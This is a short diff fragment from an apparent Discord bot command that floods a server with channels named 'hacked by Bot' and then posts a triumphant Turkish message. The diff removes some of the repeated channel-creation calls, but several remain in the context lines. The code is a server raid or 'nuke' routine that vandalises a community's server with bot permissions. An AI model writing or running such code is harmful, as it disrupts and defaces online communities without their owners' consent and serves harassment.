@@ -452,16 +452,6 @@ exports.run = (client, message, params) => {
         message.guild.createChannel('hacked by Bot');
         message.guild.createChannel('hacked by Bot');
         message.guild.createChannel('hacked by Bot');
-        message.guild.createChannel('hacked by Bot');
-        message.guild.createChannel('hacked by Bot');
-        message.guild.createChannel('hacked by Bot');
-        message.guild.createChannel('hacked by Bot');
-        message.guild.createChannel('hacked by Bot');
-        message.guild.createChannel('hacked by Bot');
-        message.guild.createChannel('hacked by Bot');
-        message.guild.createChannel('hacked by Bot');
-        message.guild.createChannel('hacked by Bot');
-        message.guild.createChannel('hacked by Bot');
        
         message.channel.send(':white_check_mark: **İşleri Bitti ! GÜCÜMÜZ !**');
         
